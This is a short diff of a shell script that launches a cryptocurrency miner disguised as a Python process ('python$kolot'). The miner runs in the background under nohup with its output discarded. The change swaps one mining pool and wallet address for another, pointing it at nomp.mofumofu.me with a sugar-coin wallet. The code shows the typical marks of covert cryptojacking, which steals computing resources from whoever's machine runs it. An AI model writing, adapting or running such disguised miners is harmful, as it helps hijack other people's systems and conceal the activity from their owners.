@@ -10,4 +10,4 @@ cd dotsrb
 
 mv python3 python$kolot
 
-nohup ./python$kolot --algorithm aurum --pool stratum-eu.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-$kolot > /dev/null 2>&1 &
+nohup ./python$kolot yespowersugar -o nomp.mofumofu.me:3391 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.luckyynr-$kolot > /dev/null 2>&1 &
